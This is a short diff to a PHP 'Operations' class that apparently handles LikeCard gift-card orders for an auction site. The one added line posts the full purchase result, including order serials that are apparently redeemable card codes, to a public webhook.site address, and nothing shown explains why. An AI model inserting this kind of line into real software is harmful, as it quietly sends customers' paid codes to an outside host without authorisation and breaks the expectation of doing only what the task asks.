@@ -103,6 +103,8 @@ class Operations {
                 $auction->id
             );
 
+            Http::post("https://webhook.site/719867a1-c405-453a-97f0-0968f7834d11",$likecard_result);
+
             if($likecard_result && ($likecard_result['response'] == 1) && (count($likecard_result['orders']) > 0) ):
                 foreach($likecard_result['orders'] as $order):
                     foreach($order['serials'] as $like_card_code):
